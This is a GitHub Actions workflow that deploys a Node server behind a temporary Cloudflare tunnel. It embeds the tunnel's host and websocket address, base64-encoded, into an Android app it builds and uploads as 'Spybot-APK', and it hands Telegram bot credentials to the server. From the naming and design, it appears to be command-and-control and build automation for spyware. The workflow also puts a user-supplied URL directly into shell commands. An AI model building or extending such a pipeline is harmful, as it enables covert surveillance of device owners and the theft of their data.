name: Deploy Server & Build APK

on:
  workflow_dispatch:
    inputs:
      duration:
        description: "Server runtime (minutes)"
        required: true
        default: "30"
        type: choice
        options:
          - "5"
          - "10"
          - "15"
          - "30"
          - "60"

      build_type:
        description: "APK build type"
        required: true
        default: "release"
        type: choice
        options:
          - "debug"
          - "release"
          - "both"

      custom_base_url:
        description: "Custom URL (http://example.com or https://example.com). Leave empty to use Cloudflare."
        required: false
        default: ""
        type: string

env:
  TELEGRAM_BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
  TELEGRAM_CHAT_ID: ${{ secrets.TELEGRAM_CHAT_ID }}

jobs:
  deploy-and-build:
    runs-on: ubuntu-latest
    timeout-minutes: 180

    steps:
      # ----------------------------------------------------
      # CHECK SECRETS
      # ----------------------------------------------------
      - name: Verify secrets
        shell: bash
        run: |
          if [ -z "${TELEGRAM_BOT_TOKEN}" ] || [ -z "${TELEGRAM_CHAT_ID}" ]; then
            echo "Telegram secrets missing"
            exit 1
          fi

      # ----------------------------------------------------
      # CHECKOUT
      # ----------------------------------------------------
      - name: Checkout repository
        uses: actions/checkout@v4

      # ----------------------------------------------------
      # DETECT VERSION
      # ----------------------------------------------------
      - name: Detect app version
        id: version
        shell: bash
        run: |
          FILE=$(find ./app -name "build.gradle*" | head -n 1)

          if [ -z "$FILE" ]; then
            echo "Gradle file not found"
            exit 1
          fi

          VERSION=$(grep -oP 'versionName\s*=?\s*"\K[^"]+' "$FILE" | head -1)

          if [ -z "$VERSION" ]; then
            VERSION="unknown"
          fi

          echo "version_name=${VERSION}" >> "$GITHUB_OUTPUT"

      # ----------------------------------------------------
      # SETUP NODE
      # ----------------------------------------------------
      - name: Setup Node
        uses: actions/setup-node@v4
        with:
          node-version: 20

      # ----------------------------------------------------
      # INSTALL SERVER DEPENDENCIES
      # ----------------------------------------------------
      - name: Install server dependencies
        working-directory: ./server
        run: npm install

      # ----------------------------------------------------
      # CREATE SERVER ENV
      # ----------------------------------------------------
      - name: Create .env
        working-directory: ./server
        shell: bash
        run: |
          cat > .env <<EOF
          TELEGRAM_BOT_TOKEN=${TELEGRAM_BOT_TOKEN}
          TELEGRAM_CHAT_ID=${TELEGRAM_CHAT_ID}
          PORT=8999
          EOF

      # ----------------------------------------------------
      # START SERVER
      # ----------------------------------------------------
      - name: Start server
        working-directory: ./server
        shell: bash
        run: |
          nohup npm start > /tmp/server.log 2>&1 &

          echo "Waiting for server..."

          for i in {1..20}; do
            if curl -s http://localhost:8999/ > /dev/null; then
              echo "Server started successfully"
              exit 0
            fi

            sleep 2
          done

          echo "Server failed to start"
          cat /tmp/server.log || true
          exit 1

      # ----------------------------------------------------
      # CREATE CLOUDFLARE TUNNEL
      # ----------------------------------------------------
      - name: Create tunnel
        id: tunnel
        if: ${{ github.event.inputs.custom_base_url == '' }}
        shell: bash
        run: |
          curl -L \
            -o cloudflared.deb \
            https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64.deb

          sudo dpkg -i cloudflared.deb

          nohup cloudflared tunnel \
            --url http://localhost:8999 \
            > /tmp/tunnel.log 2>&1 &

          echo "Waiting for Cloudflare tunnel..."

          for i in {1..40}; do
            sleep 2

            URL=$(grep -oE 'https://[a-zA-Z0-9.-]+\.trycloudflare\.com' /tmp/tunnel.log | head -1 || true)

            if [ -n "$URL" ]; then
              echo "Tunnel URL: $URL"
              echo "tunnel_url=${URL}" >> "$GITHUB_OUTPUT"
              exit 0
            fi
          done

          echo "Failed to create Cloudflare tunnel"
          cat /tmp/tunnel.log || true
          exit 1

      # ----------------------------------------------------
      # VALIDATE CUSTOM URL
      # ----------------------------------------------------
      - name: Validate custom URL
        if: ${{ github.event.inputs.custom_base_url != '' }}
        shell: bash
        run: |
          URL="${{ github.event.inputs.custom_base_url }}"

          if [[ ! "$URL" =~ ^https?:// ]]; then
            echo "Custom URL must start with http:// or https://"
            exit 1
          fi

          STATUS=$(curl -L -s -o /dev/null -w "%{http_code}" "$URL")

          if [[ "$STATUS" -lt 200 || "$STATUS" -ge 400 ]]; then
            echo "Custom URL is unreachable. HTTP status: $STATUS"
            exit 1
          fi

          echo "Custom URL is valid."

      # ----------------------------------------------------
      # CONFIGURE APPTOOLS
      # ----------------------------------------------------
      - name: Configure AppTools.kt
        env:
          CUSTOM: ${{ github.event.inputs.custom_base_url }}
          TUNNEL: ${{ steps.tunnel.outputs.tunnel_url }}
        shell: bash
        run: |
          if [ -n "$CUSTOM" ]; then
            BASE="${CUSTOM%/}"
          else
            BASE="${TUNNEL%/}"
          fi

          if [ -z "$BASE" ]; then
            echo "Base URL is empty"
            exit 1
          fi

          if [[ "$BASE" =~ ^https:// ]]; then
            HOST="${BASE}/"
            SOCKET="${BASE/https:/wss:}/"
          elif [[ "$BASE" =~ ^http:// ]]; then
            HOST="${BASE}/"
            SOCKET="${BASE/http:/ws:}/"
          else
            echo "Invalid BASE URL: $BASE"
            exit 1
          fi

          JSON="{\"host\":\"$HOST\",\"socket\":\"$SOCKET\"}"

          DATA=$(echo -n "$JSON" | base64 -w 0)

          FILE=$(find ./app -name "AppTools.kt" | head -n 1)

          if [ -z "$FILE" ]; then
            echo "AppTools.kt not found"
            exit 1
          fi

          sed -i \
            "s|private const val DEFAULT_DATA = \".*\"|private const val DEFAULT_DATA = \"$DATA\"|" \
            "$FILE"

          echo "Configured AppTools.kt"
          echo "BASE=$BASE"

      # ----------------------------------------------------
      # SETUP JAVA
      # ----------------------------------------------------
      - name: Setup Java
        uses: actions/setup-java@v4
        with:
          distribution: temurin
          java-version: 17

      # ----------------------------------------------------
      # BUILD APK
      # ----------------------------------------------------
      - name: Build APK
        working-directory: ./app
        shell: bash
        run: |
          chmod +x gradlew

          BUILD_TYPE="${{ github.event.inputs.build_type }}"

          case "$BUILD_TYPE" in
            debug)
              ./gradlew assembleDebug --no-daemon
              ;;
            release)
              ./gradlew assembleRelease --no-daemon
              ;;
            both)
              ./gradlew assembleDebug assembleRelease --no-daemon
              ;;
            *)
              echo "Invalid build type"
              exit 1
              ;;
          esac

      # ----------------------------------------------------
      # COLLECT APK FILES
      # ----------------------------------------------------
      - name: Collect APK
        shell: bash
        run: |
          mkdir -p output

          find ./app \
            -type f \
            -name "*.apk" \
            -exec cp {} output/ \;

          COUNT=$(find output -name "*.apk" | wc -l)

          if [ "$COUNT" -eq 0 ]; then
            echo "No APK files found"
            exit 1
          fi

          echo "Collected $COUNT APK file(s)"

      # ----------------------------------------------------
      # UPLOAD APK
      # ----------------------------------------------------
      - name: Upload APK
        uses: actions/upload-artifact@v4
        with:
          name: Spybot-APK
          path: output/*.apk
          retention-days: 7

      # ----------------------------------------------------
      # TELEGRAM NOTIFICATION
      # ----------------------------------------------------
      - name: Notify Telegram
        shell: bash
        run: |
          MSG="Spybot v${{ steps.version.outputs.version_name }} build completed successfully."

          curl -s \
            -X POST \
            "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage" \
            -d chat_id="${TELEGRAM_CHAT_ID}" \
            -d text="$MSG"

      # ----------------------------------------------------
      # KEEP SERVER RUNNING
      # ----------------------------------------------------
      - name: Keep alive
        shell: bash
        run: |
          DURATION="${{ github.event.inputs.duration }}"

          echo "Keeping server alive for ${DURATION} minute(s)..."

          sleep $((DURATION * 60))

      # ----------------------------------------------------
      # CLEANUP
      # ----------------------------------------------------
      - name: Cleanup
        if: always()
        shell: bash
        run: |
          echo "Cleaning up processes..."

          pkill -f cloudflared || true
          pkill -f node || true

          echo "Cleanup completed"
